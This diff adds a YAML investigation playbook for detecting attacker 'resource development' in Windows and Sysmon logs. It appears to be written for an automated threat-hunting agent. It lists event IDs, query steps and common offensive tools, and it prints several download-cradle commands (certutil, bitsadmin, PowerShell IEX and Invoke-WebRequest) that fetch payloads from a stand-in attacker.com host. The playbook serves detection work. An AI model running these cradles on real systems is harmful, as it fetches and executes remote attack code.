@@ -1,0 +1,189 @@
+name: resource_development
+display_name: Resource Development Detection
+description: Investigation strategies for detecting resource development - identifying attacker infrastructure setup, tool acquisition, and capability development
+
+playbook: |
+  ## RESOURCE DEVELOPMENT INVESTIGATION PLAYBOOK
+  
+  ### What is Resource Development?
+  Techniques attackers use to build and acquire infrastructure, tools, and capabilities to support operations. This often occurs BEFORE the attack but leaves traces during execution.
+  
+  ### Key Indicators to Investigate:
+  
+  1. **Tool Download/Acquisition (Event ID 4688, Sysmon 1, 3, 11)**
+     - Downloading attack tools from internet
+     - Commands:
+       - `certutil.exe -urlcache -f http://attacker.com/tool.exe`
+       - `bitsadmin.exe /transfer job http://attacker.com/tool.exe`
+       - `powershell.exe -c IEX(New-Object Net.WebClient).DownloadFile()`
+       - `wget`, `curl` (if installed)
+     - Fields: EventData.CommandLine, EventData.DestinationIp
+     - Query: `search_events_by_content` for download commands
+     - Red flags: Downloads from suspicious domains, tool repositories
+  
+  2. **Attack Tool Compilation (Event ID 4688, Sysmon 1)**
+     - Compiling custom tools on compromised systems
+     - Processes: csc.exe (C# compiler), cl.exe (C++ compiler), msbuild.exe
+     - Fields: EventData.NewProcessName, EventData.CommandLine
+     - Query: `search_events_by_content` for 'csc.exe', 'msbuild.exe'
+     - Red flags: Compilation of suspicious code, obfuscation tools
+  
+  3. **GitHub/GitLab Repository Cloning (Event ID 4688, Sysmon 3)**
+     - Cloning attack tool repositories
+     - Commands: `git clone https://github.com/attacker/tool.git`
+     - Query: `search_events_by_content` for 'git clone'
+     - Common repositories:
+       - Mimikatz, PowerSploit, Empire, Covenant
+       - Exploit frameworks (Metasploit, Cobalt Strike)
+     - Red flags: Cloning offensive security tool repos
+  
+  4. **Script/Payload Creation (Sysmon 11)**
+     - Creating malicious scripts on disk
+     - File types: .ps1, .bat, .vbs, .hta, .js
+     - Fields: EventData.TargetFilename
+     - Query: `search_events_by_content` for script extensions in unusual locations
+     - Red flags: Scripts in Temp, AppData, ProgramData
+  
+  5. **Obfuscation Tool Usage (Event ID 4688, Sysmon 1)**
+     - Using tools to obfuscate payloads
+     - Tools: Invoke-Obfuscation, Veil, Shellter
+     - Query: `search_events_by_content` for obfuscation tool names
+     - Red flags: Obfuscated PowerShell, packed executables
+  
+  6. **Exploit Kit Downloads (Sysmon 3, 11)**
+     - Downloading exploit frameworks
+     - Tools: Metasploit, Cobalt Strike, Empire
+     - Query: Check for connections to known exploit kit domains
+     - Red flags: Large downloads from offensive security sites
+  
+  7. **Infrastructure Testing (Sysmon 3)**
+     - Testing C2 connectivity from compromised host
+     - Patterns:
+       - Ping/connectivity tests to attacker infrastructure
+       - DNS queries to C2 domains
+     - Query: Aggregate Sysmon 3 for external connections during setup phase
+     - Red flags: Connections to newly registered domains, suspicious IPs
+  
+  8. **Credential Harvesting Tool Setup (Event ID 4688, Sysmon 1, 11)**
+     - Deploying credential theft tools
+     - Tools: Mimikatz, LaZagne, CredentialManager
+     - Query: `search_events_by_content` for credential tool names
+     - Red flags: Credential dumping tools in unusual locations
+  
+  9. **Persistence Tool Installation (Event ID 4688, Sysmon 1, 11)**
+     - Installing backdoors, remote access tools
+     - Tools: Cobalt Strike beacon, Meterpreter, custom backdoors
+     - Query: Look for RAT installations, backdoor binaries
+     - Red flags: Unsigned executables with network capabilities
+  
+  10. **Staging Directories Creation (Sysmon 11)**
+     - Creating directories for tools and data
+     - Common paths: C:\Temp\, C:\ProgramData\, C:\Users\Public\
+     - Query: `search_events_by_content` for staging directory creation
+     - Red flags: Directories with random names, hidden attributes
+  
+  ### Investigation Strategy:
+  
+  **Phase 1 - Identify Resource Acquisition**
+  - Look for download commands (certutil, bitsadmin, PowerShell)
+  - Check for tool compilation (csc.exe, msbuild.exe)
+  - Query for git clone operations
+  
+  **Phase 2 - Catalog Acquired Tools**
+  - What tools were downloaded? (Mimikatz, Cobalt Strike, etc.)
+  - Where were they stored? (Staging directories)
+  - Were they obfuscated? (Packed, encoded)
+  
+  **Phase 3 - Timeline Analysis**
+  - When were tools acquired? (Before or after initial access)
+  - How long between acquisition and use?
+  - Were tools deleted after use? (Cleanup)
+  
+  **Phase 4 - Infrastructure Mapping**
+  - What external IPs/domains were contacted?
+  - Are they attacker-controlled infrastructure?
+  - Check reputation (VirusTotal, threat intel)
+  
+  ### Common Tool Acquisition Patterns:
+  
+  - **LOLBin Download**: certutil → Download tool → Execute → Delete
+  - **PowerShell Cradle**: IEX(New-Object Net.WebClient).DownloadString() → Fileless execution
+  - **Git Clone**: git clone offensive repo → Compile → Execute
+  - **BITS Transfer**: bitsadmin download → Persistence → Cleanup
+  
+  ### Common Attack Tools:
+  
+  **Credential Access**:
+  - Mimikatz - Credential dumping
+  - LaZagne - Password recovery
+  - ProcDump - LSASS dumping
+  
+  **Lateral Movement**:
+  - PsExec - Remote execution
+  - WMI - Windows Management Instrumentation
+  - PowerShell Empire - Post-exploitation framework
+  
+  **Command & Control**:
+  - Cobalt Strike - Commercial C2 framework
+  - Meterpreter - Metasploit payload
+  - Covenant - .NET C2 framework
+  
+  **Reconnaissance**:
+  - BloodHound - AD enumeration
+  - SharpHound - BloodHound collector
+  - PowerView - AD reconnaissance
+  
+  **Exploitation**:
+  - Metasploit - Exploit framework
+  - Exploit DB tools - Public exploits
+  
+  ### Download Command Patterns:
+  
+  ```powershell
+  # PowerShell download cradles
+  IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+  (New-Object Net.WebClient).DownloadFile('http://attacker.com/tool.exe', 'C:\Temp\tool.exe')
+  Invoke-WebRequest -Uri 'http://attacker.com/tool.exe' -OutFile 'C:\Temp\tool.exe'
+  
+  # certutil abuse
+  certutil.exe -urlcache -split -f http://attacker.com/tool.exe C:\Temp\tool.exe
+  
+  # bitsadmin abuse
+  bitsadmin.exe /transfer job /download /priority high http://attacker.com/tool.exe C:\Temp\tool.exe
+  
+  # Git clone
+  git clone https://github.com/attacker/offensive-tool.git C:\Temp\tool
+  ```
+  
+  ### Key Questions to Answer:
+  
+  1. What tools were acquired? (Names, types, purposes)
+  2. How were they acquired? (Download, compile, clone)
+  3. When were they acquired? (Timeline)
+  4. Where were they stored? (Staging directories)
+  5. Were they used? (Check for execution events)
+  6. Were they deleted? (Cleanup operations)
+  7. What infrastructure was contacted? (Download sources, C2)
+  
+  ### Behavioral Indicators:
+  
+  - **Pre-Staged**: Tools downloaded before initial access (compromised staging server)
+  - **On-Demand**: Tools downloaded as needed during attack
+  - **Fileless**: Tools executed in-memory (no disk artifacts)
+  - **Custom**: Compiled or modified tools (not off-the-shelf)
+  
+  ### Infrastructure Indicators:
+  
+  - **Attacker-Controlled**: Domains registered by attacker
+  - **Compromised**: Legitimate sites hosting malicious tools
+  - **Public**: GitHub, Pastebin, file-sharing sites
+  - **Cloud**: AWS, Azure, Google Cloud storage
+  
+  ### Note on Investigation Scope:
+  
+  Resource Development often occurs OUTSIDE the victim network (attacker infrastructure setup). Focus on:
+  - Tools downloaded TO the victim network
+  - Infrastructure contacted FROM the victim network
+  - Capabilities deployed ON victim systems
+  
+  This playbook focuses on EVIDENCE of resource development visible in victim logs, not the attacker's external infrastructure setup.
